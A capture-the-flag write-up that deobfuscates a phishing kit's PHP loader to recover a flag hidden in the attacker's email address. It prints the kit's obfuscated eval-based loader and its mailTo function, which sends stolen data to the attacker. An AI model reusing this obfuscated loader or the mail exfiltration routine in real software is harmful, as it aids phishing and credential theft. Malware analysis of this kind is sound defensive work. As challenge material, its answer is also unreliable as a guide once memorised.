## Chall description
```
Category: Malware
Oh great, another phishing kit. This has some functionality to even send stolen data over email! Can you track down the email address they send things to?

The password to the archive is infected. Uncover the flag from the file provided.
```
## Procedure
After extract the zip content we can see a `j.php` file, we modified `NmVIQ` for `echo` to recover the content from `octal`

```php
<?php
goto oxiT1; KC3di: $sl5eq = $lFKwz($sl5eq); 
goto m4J3j; zEIti: $GGMnR = $sl5eq(); 
goto g0hmD; m4J3j: $VhLHm = $lFKwz($VhLHm); 
goto NmVIQ; g0hmD: $AQTh0(); goto FkkRP; 
C9ufu: $d8Mzs($fPdlo($lFKwz($FRczk))); 
goto zEIti; yLDSn: $VhLHm = "\x20\40\142\x32\112\x66\x63\x33\x52\x68\x63\156\121\x3d"; 
goto vZvXQ; vZvXQ: $sl5eq = "\x62\62\x4a\146\132\x32\126\60\130\62\116\x76\142\156\122\x6c\142\156\x52\x7a"; 
goto lo0I_; ddvsq: $fPdlo = $lFKwz($fPdlo); goto CcPTn; G3Rr2: $VhLHm(); goto C9ufu; 
a4yHD: $fPdlo = "\40\x5a\63\160\x31\x62\x6d\116\x76\x62\x58\x42\x79\132\x58\x4e\172"; 
goto yLDSn; zFUky: $OovTE = $lFKwz($OovTE); goto Cciv0; fDcHz: $AQTh0 = $lFKwz($AQTh0); 
goto KC3di; Cciv0: $d8Mzs = $iQPa4("\44\137", $OovTE); goto fDcHz; 
CMzN3: $iQPa4 = "\130\x31\71\x73\x59\127\x31\151\132\x47\x45\x3d"; 
goto a4yHD; 
CcPTn: if (!function_exists("\137\x5f\154\x61\x6d\x62\x64\141")) { 
	function __lambda($sZ_lH, $AP_tK) { 
		return eval("\x72\x65\164\165\x72\x6e\40\146\x75\156\143\x74\x69\157\156\x28{$sZ_lH}\51\x7b{$AP_tK}\x7d\x3b"); 
	} 
} 

goto oSLxJ; 

NmVIQ: echo "\145\112\172\164\57\126\154\172\64\164\162\127\71\167\166\145\156\60\71\122\106\170\130\170\126\163\127\165\161\1 ...snip...
```

This show us a base64 strings
```bash
php j.php
eJzt/Vlz4trW9wven09RFxXxVsWuqAeByZ3EiXNhDMJgIycCieamAoPTGARmpbFpPn39xpzqkQBn5lrvfp6TEPRCms2YY472P/4f/u3/+f/j9n/9r/WPl9Xm+//6P9VH//Z//a8
...snip...
ftqGsvkejOMZ+9j/9b/+z//j//h//HO3/+f/T93+L/X6//I//b//z8/8PfbfS/6or6H+9P/6X/L8v/4/4WXDnv8f/41uyY7pMQxGUvfr//1//v8BUO7u4g==
Warning: gzuncompress(): data error
```

Afte decode the base64 `Warning: gzuncompress():` got us an idea for the next step
<img width="1348" height="556" alt="Screenshot 2025-10-11 at 1 08 52 PM" src="https://github.com/user-attachments/assets/6750222a-775b-4a1b-811d-4630771f4a2d" />

Decode the new base64 strings again
<img width="1357" height="783" alt="Screenshot 2025-10-11 at 1 12 41 PM" src="https://github.com/user-attachments/assets/f880cb1c-f51b-4bee-b7bd-50005c344432" />

After read the final code, we can see the email function with our flag
```
public function mailTo($add,$cont){
		$subject='++++Office Email From Greatness+++++';
		$headers='Content-type: text/html; charset=UTF-8' . "\r\nFrom: Greatness <ghost+}f7113307018770d52d4f94fec013197f{galf@greatness.com>" . "\r\n";
		@mail($add,$subject,$cont,$headers);
	}
```

Flag `flag{f791310cef49f4d25d0778107033117f}`
